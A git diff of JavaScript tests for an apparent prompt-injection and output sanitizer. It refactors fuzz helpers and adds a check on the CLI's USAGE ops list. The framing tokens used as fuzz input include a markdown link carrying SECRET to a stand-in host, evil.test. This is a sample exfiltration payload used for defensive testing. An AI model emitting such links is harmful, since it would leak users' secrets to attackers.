@@ -22,8 +22,13 @@ import { sanitize } from "../src/index.mjs";
 import { classifyPrompt } from "../src/prompt.mjs";
 import { sanitizeText } from "../src/output.mjs";
 import { scanInstructionFiles } from "../src/instructions.mjs";
-import { createLineSplitter, parseArgs, USAGE } from "../bin/sanitize-cli.mjs";
-import { fcRunOptions } from "./test-helpers.mjs";
+import {
+  createLineSplitter,
+  parseArgs,
+  USAGE,
+  OPS,
+} from "../bin/sanitize-cli.mjs";
+import { fcRunOptions, unicodeChar, loneSurrogate } from "./test-helpers.mjs";
 
 const ESC = "\u001b";
 
@@ -253,13 +258,6 @@ const FRAMING_TOKENS = [
   "[t](https://evil.test/?d=SECRET)",
 ];
 
-const unicodeChar = fc
-  .integer({ min: 0, max: 0x10ffff })
-  .filter((c) => c < 0xd800 || c > 0xdfff)
-  .map((c) => String.fromCodePoint(c));
-const loneSurrogate = fc
-  .integer({ min: 0xd800, max: 0xdfff })
-  .map((c) => String.fromCharCode(c));
 const fuzzText = fc
   .array(
     fc.oneof(unicodeChar, loneSurrogate, fc.constantFrom(...FRAMING_TOKENS)),
@@ -757,6 +755,22 @@ describe("parseArgs", () => {
     it(`${argv.slice(2).join(" ") || "(no args)"} → ${expected.mode}`, () =>
       assert.deepEqual(parseArgs(argv), expected));
   }
+});
+
+describe("USAGE ops list", () => {
+  it("names every key of OPS, and only those, in dispatch order", () => {
+    // Guards the derivation itself: if USAGE stopped being built from
+    // Object.keys(OPS), this catches the drift the moment an op is added,
+    // renamed, or removed.
+    const sentence = USAGE.match(/Ops: ([^.]+)\./)?.[1];
+    assert.ok(sentence, "USAGE must contain an 'Ops: …' sentence");
+    const named = sentence
+      .split(",")
+      .map((name) => name.trim().replace(" (default)", ""));
+    assert.deepEqual(named, Object.keys(OPS));
+    // The default op stays called out as such.
+    assert.ok(sentence.includes("sanitize (default)"));
+  });
 });
 
 describe("CLI flag behavior (spawned)", () => {
